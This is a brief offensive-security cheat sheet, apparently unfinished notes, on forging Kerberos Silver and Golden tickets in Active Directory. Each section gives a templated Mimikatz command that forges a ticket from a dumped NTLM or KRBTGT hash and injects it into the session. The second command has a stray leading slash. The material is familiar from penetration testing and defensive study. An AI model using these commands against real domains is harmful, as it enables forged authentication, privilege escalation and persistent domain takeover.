**Silver ticket**

A Silver ticket is a valid TGS ticket forged by an attacker. The attacker has to gain knowledge of the password hash for the target service. An attacker with admin rights to the computer or able to run code as local System can dump the AD computer account password hash from the system using Mimikatz.\
Most services do not validate the PAC, so a valid TGS generated with the service account password hash can include a PAC that is entirely fictitious.

* `mimikatz "kerberos::golden /user:<USERNAME> /id:<USERRID> /domain:<DOMAIN> /sid:<SID> /target:<TARGETSERVER> /rc4:<NTLMHASH> /service:<APPLICATIONANME> /ptt" exit`

WiP export/use ticket ; impacket ; metasploit



**Golden ticket**

A Golden ticket is a valid TGT ticket, encrypted/signed by the domain Kerberos account (KRBTGT) forged by an attacker. Once an attacker has admin access to a Domain Controller, the KRBTGT account password hashes can be extracted using Mimikatz.

* `mimikatz "/kerberos::golden /domain:<DOMAIN> /user:<USERNAME> /sid:<SID> /krbtgt:<NTLMHASH> /ptt" exit`

WiP export/use ticket ; impacket ; metasploit
